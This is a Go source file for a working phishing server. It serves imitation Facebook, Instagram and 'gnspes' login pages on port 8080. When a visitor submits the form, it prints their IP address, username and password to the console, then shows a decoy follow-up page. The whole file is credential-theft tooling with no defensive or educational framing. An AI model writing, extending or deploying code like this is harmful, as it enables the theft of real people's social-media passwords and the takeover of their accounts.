package main

import (
        "net"
        "fmt"
       "time"
        "net/http"
	//"strings"
	//"log"
	//"io/ioutil"
	//"encoding/json"
)

func login(w http.ResponseWriter, r *http.Request, filePath string, filePath2 string) {
	
	if r.Method == "POST" {
		name := r.FormValue("username")
                pass := r.FormValue("password")
                ip := r.RemoteAddr
		time := currentTime()


		fmt.Println("Ip address = ", ip, " : ", filePath, " : ", time,  "\n")
                fmt.Println("Username = ", name, "\n")
                fmt.Println("Password = ", pass, "\n")

		http.ServeFile(w, r, filePath2)
	} 

	if r.Method == "GET" {
		http.ServeFile(w, r, filePath)		

	}

}
//function for the facebook login page
func facebookLogin (w http.ResponseWriter, r *http.Request) {
	ip := r.RemoteAddr
        time := currentTime()

        fmt.Println("Ip address = ", ip, " : ", time,  "\n")

	login(w, r, "facebook.html", "monkeyBuisness.html")
}
//function for gnspes login page
func gnspesLogin (w http.ResponseWriter, r *http.Request) {
        ip := r.RemoteAddr
        time := currentTime()

        fmt.Println("Ip address = ", ip, " : ", time,  "\n")

	login(w, r, "Gnspes.html", "static.html") 
}

//function for gnspes login page
func instagramLogin (w http.ResponseWriter, r *http.Request) {
        ip := r.RemoteAddr
        time := currentTime()

        fmt.Println("Ip address = ", ip, " : ", time,  "\n")

        login(w, r, "instagram.html", "static.html")
}


//function to return the formatted time
func currentTime() string {

	current_time := time.Now()
        time := current_time.Format("2006-01-02 15:04:05")

	return time
}

//function to return local ip as string
func GetLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return ""
    }
    for _, address := range addrs {
        // check the address type and if it is not a loopback the display it
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String()
            }
        }
    }
    return ""
}

func main() {

	fmt.Println("Local IP:", GetLocalIP())

	http.HandleFunc("/facebook", facebookLogin)

	http.HandleFunc("/gnspes", gnspesLogin)

	http.HandleFunc("/instagram", instagramLogin)

	http.ListenAndServe(":8080", nil)

}
